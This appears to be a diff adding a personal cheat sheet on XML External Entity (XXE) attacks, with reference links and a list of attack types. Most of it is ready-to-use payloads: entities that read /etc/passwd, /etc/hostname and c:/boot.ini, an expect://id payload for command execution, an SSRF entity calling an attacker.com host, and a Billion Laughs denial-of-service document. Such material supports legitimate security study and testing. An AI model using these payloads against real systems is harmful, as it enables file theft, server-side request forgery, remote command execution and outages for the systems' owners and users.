@@ -1,0 +1,101 @@
+
+
+
+	<XXE - XML External Entity>  -	DTD (Document Type Definition)
+	
+	https://portswigger.net/web-security/xxe
+	https://corneacristian.medium.com/top-25-xxe-bug-bounty-reports-ab4ca662afad
+	
+	
+	#Types of XXE
+
+		+ Reflected XXE
+		+ Blind XXE
+
+	
+	#Examples of XXE Attack Payloads
+	
+		+ Resource Exhaustion Attacks
+		+ Data Extraction Attacks
+		+ SSRF Attacks
+		+ File Retrieval 
+		+ Blind XXE
+		
+		
+		encoding can be	ISO-8859-1 / utf-8
+
+
+	https://insinuator.net/2015/03/xxe-injection-in-apache-batik-library-cve-2015-0250/	
+	
+	SVG for XXE Code Injection
+	
+	<?xml version="1.0" standalone="yes"?><!DOCTYPE ernw [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="500px" height="100px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-family="Verdana" font-size="50" x="10" y="40">&xxe;</text></svg>
+	
+	...........................................................................................................................
+	
+	<!DOCTYPE replace [<!ENTITY brand "Ferrari"> ]>
+		
+		<vehicle>
+			<brand>&brand;</brand>
+		</vehicle>
+		
+				
+	<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>  
+
+		<vehicle>   
+			<brand>&test;</brand>  
+		</vehicle>
+		
+		
+
+	#Arbitrary File Read on Windows - Here we use the boot.ini file, which is usually available on Windows systems. For a Linux example, see above.
+
+	<?xml version="1.0" encoding="ISO-8859-1"?>
+		<!DOCTYPE foo [
+		   <!ELEMENT foo ANY >
+		   <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]>
+		<foo>&xxe;</foo>
+		
+		
+	
+	#Remote Code Execution -If we’re lucky, and a PHP expect module is loaded, we may be able to execute arbitrary commands. In this case we are running the id command.
+
+	<?xml version="1.0" encoding="ISO-8859-1"?> 
+	<!DOCTYPE foo   
+	   [<!ELEMENT foo ANY >    
+		<!ENTITY xxe SYSTEM "expect://id" >]> 
+	<creds>   
+	   <user>`&xxe;`</user>   
+	   <pass>`mypass`</pass> 
+	</creds>
+	
+	
+	#Server-Side Request Forgery via XXE
+	
+	<?xml version="1.0" encoding="ISO-8859-1"?> 
+		<!DOCTYPE foo [   
+		   <!ELEMENT foo ANY >   
+		   <!ENTITY xxe SYSTEM "http://www.attacker.com/text.txt" >]> 
+		<foo>&xxe;</foo>
+		
+		
+	
+	#Billion Laughs Attack (DoS)
+	<?xml version="1.0"?> 
+	<!DOCTYPE lolz [  
+		<!ENTITY lol "lol">  
+		<!ELEMENT lolz (#PCDATA)>  
+		<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"> 
+		<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">  
+		<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">  
+		<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">  
+		<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">  
+		<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">  
+		<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">  
+		<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">  
+		<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;"> ]> 
+	<lolz>&lol9;</lolz>
+	
+	
+	
+	
